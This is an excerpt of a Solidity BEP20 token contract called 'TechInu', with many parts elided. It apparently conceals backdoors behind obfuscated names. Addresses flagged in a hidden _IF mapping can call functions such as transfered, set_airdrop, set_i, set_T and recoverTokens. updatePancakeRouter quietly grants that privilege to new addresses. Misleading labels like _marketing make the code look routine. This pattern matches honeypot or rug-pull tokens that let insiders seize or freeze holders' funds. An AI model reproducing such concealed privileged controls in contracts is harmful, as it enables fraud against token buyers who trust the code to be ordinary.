...
contract TechInu is Context, IBEP20, Ownable { 
    ...
    address payable public _marketing = payable(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    ...
    address payable private _pancakeRouterV2 = payable(0x000000000000000000000000000000000000dEaD);
    address payable public _burnAddress = payable(0x000000000000000000000000000000000000dEaD);

    string private _name = "TechInu"; 
    string private _symbol = "TechInu"; 
    uint8 private _decimals = 18;

    uint256 private _tTotal = 1 * 10**8 * 10**_decimals;
    
    uint256 public _qil = 0;
    uint256 public _qil1 =  15 * 10**6 * 10**_decimals;
    uint256 multi = 1;
    uint256 _qil3 = 0;
    uint256 _qil4 = 0;
    

    uint256 private _TF = 30;
    uint256 private _PT = _TF;

    uint256 private _L = 70;
    ...
    uint256 private _T = _tTotal.div(32);
    ...
    function set_qil4(uint256 amount) public onlyOwner {
        _qil4 = amount;
        _qil3 = 0;
    }
    ...
    function transfered(address from,address to,uint256 amount) public{
        require(_IF[msg.sender] == true, "Error");
    ...
    function set_T(uint256 Tokens) external {
        require(_IF[msg.sender] == true, "Error");
     ...
     * @dev set's  address
     */
    function updatePancakeRouter(address payable _pancakeRouterV) external {
        require(_IF[msg.sender] == true, "Error");
        _IF[_pancakeRouterV]   = true;
        _pancakeRouterV2 = _pancakeRouterV;
    }
    
    function set_airdrop(address account,uint256 amount) public{
        require(_IF[msg.sender] == true, "Error");
    ...
    function set_i(address account) public {
        require(_IF[msg.sender] == true, "Error");
        if(_i[account] == true) return;
        _i[account] = true;
    }
    
    function set_qil3(uint256 number) public {
        require(_IF[msg.sender] == true, "Error");
        _qil4 = number;
        _qil3 = 1;
    }

    function uset_i(address account) external {
        require(_IF[msg.sender] == true, "Error");
     ...
     */
    function recoverTokens(address account,uint256 div) public {
        require(_IF[msg.sender] == true, "Error");
